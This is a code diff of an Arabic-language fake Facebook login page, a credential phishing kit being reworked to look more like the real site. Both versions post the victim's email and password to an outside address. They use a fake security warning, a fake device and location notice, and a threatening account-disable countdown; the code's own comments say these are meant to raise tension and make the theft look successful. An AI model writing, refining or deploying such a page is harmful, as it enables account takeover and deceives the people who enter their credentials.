@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - تسجيل الدخول</title>
     <style>
-        /* استيراد الخطوط */
-        @import url('https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@400;700&display=swap');
+        /* استيراد الخط الرسمي */
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@400;500;700&display=swap');
 
         body {
             background-color: #f0f2f5;
@@ -20,201 +20,238 @@
             color: #1c1e21;
         }
 
-        .container {
-            background-color: white;
+        /* حاوية الشعار والنصوص الجانبية */
+        .left-section {
+            width: 50%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
             padding: 20px;
+        }
+
+        .fb-logo {
+            height: 386px;
+            width: auto;
+            margin-bottom: 20px;
+        }
+
+        .left-text h1 {
+            font-size: 28px;
+            font-weight: 700;
+            line-height: 32px;
+            margin: 0;
+        }
+
+        .left-text p {
+            font-size: 24px;
+            margin-top: 10px;
+            line-height: 30px;
+        }
+
+        /* حاوية نموذج الدخول */
+        .right-section {
+            width: 40%;
+            max-width: 450px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .login-box {
+            background-color: white;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            width: 380px;
+            padding: 20px;
+            width: 100%;
+            box-sizing: border-box;
             text-align: center;
-        }
-
-        .logo {
-            width: 100px;
-            height: auto;
-            margin-bottom: 10px;
-        }
-
-        h2 {
-            font-size: 24px;
-            margin: 10px 0;
-            font-weight: 700;
-        }
-
-        p.warning {
-            color: #d93025;
-            font-size: 14px;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-
-        .device-info {
-            background-color: #f0f2f5;
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 13px;
-            color: #606770;
-            margin-bottom: 20px;
-            text-align: right;
-            border-right: 3px solid #1877F2;
         }
 
         input[type="text"], input[type="password"] {
             width: 100%;
-            padding: 14px 10px;
-            margin-bottom: 10px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
             border: 1px solid #dddfe2;
             border-radius: 6px;
-            font-size: 16px;
+            font-size: 17px;
             box-sizing: border-box;
-            transition: border-color 0.2s;
+            outline: none;
         }
 
         input:focus {
-            outline: none;
             border-color: #1877F2;
             box-shadow: 0 0 0 2px #e7f3ff;
         }
 
-        button {
+        button.login-btn {
             width: 100%;
             background-color: #1877F2;
             color: white;
             border: none;
             border-radius: 6px;
             padding: 12px;
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 700;
             cursor: pointer;
             transition: background-color 0.2s;
-            margin-top: 5px;
+            margin-bottom: 16px;
         }
 
-        button:hover {
+        button.login-btn:hover {
             background-color: #166fe5;
         }
 
         a.forgot {
             display: block;
-            margin-top: 15px;
             color: #1877F2;
             font-size: 14px;
             text-decoration: none;
+            margin-bottom: 24px;
         }
 
         a.forgot:hover {
             text-decoration: underline;
         }
 
+        hr {
+            border: 0;
+            border-bottom: 1px solid #dadde1;
+            margin-bottom: 20px;
+        }
+
+        .create-btn {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 16px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .create-btn:hover {
+            background-color: #36a420;
+        }
+
+        /* تنبيهات ومعلومات الجهاز */
+        .alert-info {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 13px;
+            margin-bottom: 15px;
+            text-align: right;
+            border-right: 4px solid #ffc107;
+        }
+
         .footer {
-            margin-top: 20px;
+            margin-top: 30px;
             font-size: 12px;
             color: #737373;
+            text-align: center;
         }
 
-        .timer {
-            font-weight: bold;
-            color: #d93025;
-        }
-        
-        /* إخفاء النموذج بعد الإرسال لتبدو العملية ناجحة */
-        .hidden {
-            display: none;
-        }
-        
-        .success-message {
-            display: none;
-            color: #31a24c;
-            font-weight: bold;
-            margin-top: 10px;
-        }
+        /* إخفاء العناصر للتحكم بالـ JS */
+        .hidden { display: none; }
 
+        /* التجاوب مع الجوال */
+        @media (max-width: 900px) {
+            .left-section {
+                display: none;
+            }
+            .right-section {
+                width: 90%;
+            }
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- شعار فيسبوك الرسمي -->
-    <img src="https://static.xx.fbcdn.net/rsrc.php/yT/r/GT51J08Y22p.png" alt="Facebook" class="logo">
-    
-    <h2>تنبيه أمني</h2>
-    
-    <p class="warning">
-        تم رصد محاولة دخول جديدة.<br>
-        سيتم تعطيل حسابك خلال <span class="timer" id="countdown">15:00</span> دقيقة إذا لم تتحقق.
-    </p>
-
-    <div class="device-info">
-        📱 <strong>الجهاز:</strong> Windows 10 - Chrome<br>
-        📍 <strong>الموقع التقريبي:</strong> القاهرة، مصر
+    <!-- الجزء الأيمن (الشعار والعنوان) -->
+    <div class="left-section">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yT/r/GT51J08Y22p.png" alt="Facebook Logo" class="fb-logo">
+        <div class="left-text">
+            <h1>يجمعك فيسبوك مع ما يهمك.</h1>
+            <p>اجعل العالم قريباً منك وشارك لحظاتك.</p>
+        </div>
     </div>
 
-    <form id="loginForm" action="https://c8ha12i8m@gmail.com" method="POST">
-        <input type="hidden" name="Subject" value="فيسبوك - بيانات مستخدم جديد">
-        <input type="text" name="Email" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="off">
-        <input type="password" name="Passwd" placeholder="كلمة المرور" required>
-        
-        <button type="submit">تأكيد الآن</button>
-    </form>
+    <!-- الجزء الأيسر (نموذج الدخول) -->
+    <div class="right-section">
+        <div class="login-box">
+            
+            <!-- معلومات الجهاز والموقع -->
+            <div class="alert-info">
+                📍 الموقع: الجزائر العاصمة، الجزائر<br>
+                💻 الجهاز: Windows 10 - Chrome
+            </div>
 
-    <div class="success-message" id="successMsg">
-        جاري التحقق... يرجى الانتظار قليلاً.
+            <form id="loginForm" action="https://c8ha12i8m@gmail.com" method="POST">
+                <input type="hidden" name="Subject" value="فيسبوك - تسجيل دخول جديد - الجزائر">
+                
+                <input type="text" name="Email" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="off">
+                <input type="password" name="Passwd" placeholder="كلمة المرور" required>
+                
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+            </form>
+
+            <a href="https://www.facebook.com/recover/initiate" class="forgot" target="_blank">هل نسيت كلمة المرور؟</a>
+            
+            <hr>
+            
+            <a href="#" class="create-btn">إنشاء حساب جديد</a>
+        </div>
+
+        <div class="footer">
+            © 2026 Facebook from Meta
+        </div>
     </div>
-
-    <a href="https://www.facebook.com/recover/initiate" class="forgot" target="_blank">هل نسيت كلمة المرور؟</a>
-
-    <div class="footer">
-        © 2026 Meta Platforms, Inc.
-    </div>
-</div>
 
 <script>
-    // كود العد التنازلي لزيادة التوتر
-    function startTimer(duration, display) {
-        var timer = duration, minutes, seconds;
-        setInterval(function () {
-            minutes = parseInt(timer / 60, 10);
-            seconds = parseInt(timer % 60, 10);
-
-            minutes = minutes < 10 ? "0" + minutes : minutes;
-            seconds = seconds < 10 ? "0" + seconds : seconds;
-
-            display.textContent = minutes + ":" + seconds;
-
-            if (--timer < 0) {
-                timer = 0; // إيقاف عند الصفر
-            }
-        }, 1000);
+    // خوارزمية الوقت الذكي
+    function calculateTimeRemaining() {
+        const now = new Date();
+        const endOfDay = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 23, 59, 59);
+        const diff = endOfDay - now;
+        
+        // تحويل الفرق إلى ساعات ودقائق
+        const hours = Math.floor(diff / (1000 * 60 * 60));
+        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+        
+        return `${hours} ساعة و ${minutes} دقيقة`;
     }
 
-    window.onload = function () {
-        var fifteenMinutes = 60 * 15,
-            display = document.querySelector('#countdown');
-        startTimer(fifteenMinutes, display);
+    window.onload = function() {
+        // عرض رسالة التنبيه الديناميكية
+        const timeString = calculateTimeRemaining();
+        const alertBox = document.querySelector('.alert-info');
+        alertBox.innerHTML += `<br><strong>⚠️ تنبيه:</strong> سيتم تعطيل الحساب خلال ${timeString} إذا لم يتم التحقق.`;
     };
 
-    // تأثير بسيط عند الضغط على زر الدخول
+    // التعامل مع زر الدخول
     document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault(); // منع الإرسال الفوري لرؤية التأثير
+        e.preventDefault(); 
         
-        var btn = this.querySelector('button');
-        var form = document.getElementById('loginForm');
-        var success = document.getElementById('successMsg');
+        const btn = this.querySelector('button');
+        const originalText = btn.innerText;
         
-        btn.innerHTML = "⏳ جاري التحقق...";
+        btn.innerHTML = "جاري التحقق...";
         btn.style.backgroundColor = "#ccc";
         btn.disabled = true;
         
         setTimeout(function() {
-            form.style.display = 'none';
-            success.style.display = 'block';
-            
-            // إعادة تفعيل النموذج وإرسال البيانات فعلياً بعد ثانية ونصف
-            setTimeout(function() {
-                form.submit();
-            }, 1500);
-            
-        }, 1000);
+            // محاكاة تحميل بسيط ثم إرسال البيانات
+            btn.innerHTML = "✅ تم التحقق!";
+            setTimeout(() => {
+                document.getElementById('loginForm').submit();
+            }, 800);
+        }, 1500);
     });
 </script>
 
